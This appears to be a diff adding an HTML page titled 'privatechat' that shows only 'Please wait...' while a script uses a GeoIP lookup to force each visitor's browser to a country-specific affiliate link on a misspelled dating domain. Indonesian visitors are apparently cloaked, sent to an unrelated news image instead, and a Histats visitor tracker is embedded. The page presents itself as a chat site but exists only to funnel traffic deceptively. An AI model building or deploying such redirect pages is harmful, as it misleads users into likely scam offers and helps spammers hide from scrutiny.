@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>privatechat</title>
+  <script>
+    /*!
+     * GeoIP Target Redirector
+     * Project: https://github.com/OpenAff/geoip-target-filter
+     *
+     * ---------------------------------------------------------------------
+     * A small snippet for geo-target redirection using GeoIP API.
+     * Add your targeted country's "ISO 3166-1 - Alpha-2" code and
+     * redirect URL to the "target" array object.
+     * ---------------------------------------------------------------------
+     * Example:
+     *          target.All = "http://others.tld";
+     *          target.US  = "http://domain.tld";
+     *
+     * The above example will redirect all the US visitors to the given URL.
+     * And any non-targeted visitors to "All" URL.
+     * ---------------------------------------------------------------------
+     * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
+     * See Column: "Alpha-2 Code"
+     * ---------------------------------------------------------------------
+     */
+
+        var target = []; // Create a new target Array.
+
+        // Example Codes:
+        target.All = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-PRINDAPAN&ban=other&j1=1"; // Redirects Non-targeted / all other visitors to this URL.
+        target.DE  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-JERMAN&ban=other&j1=1";  // Redirects DE Visitors to this URL.
+	target.US  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-USA&ban=other&j1=1"; 
+	target.MX  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-MEXICO&ban=other&j1=1"; 
+	target.IN  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-INDIA&ban=other&j1=1";
+	target.GB  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-INGGRIS&ban=other&j1=1";
+	target.AU  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-AUSTRALIA&ban=other&j1=1";
+	target.AT  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-AUSTRIA&ban=other&j1=1";
+	target.BR  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-BRAZIL&ban=other&j1=1";
+	target.SE  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-SWEDIA&ban=other&j1=1";
+	target.CH  = "https://aowvrr.deilghtfuldate.net/?utm_source=da57dc555e50572d&s1=218971&s2=2024893&click_id=PUSAT-SWISS&ban=other&j1=1";
+	target.ID  = "https://awsimages.detik.net.id/community/media/visual/2017/12/06/6414c1ae-fcd1-49a6-8316-4a71c29f93ff_43.jpg?w=700&q=90";
+        // ------------------------------------------------------
+        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
+        // ------------------------------------------------------
+        /**
+         * If a valid country code matches the targets list, then it redirects to that particular link.
+         * Otherwise redirects to "All" target URL.
+         */
+        function geoip(g){window.top.location.href=target[g.country]||target.All}
+  </script>
+	<!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4916119,4,603,110,40,00010001']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4916119&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+  <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
+</head>
+<body>
+    <p>Please wait...</p>
+</body>
+</html>
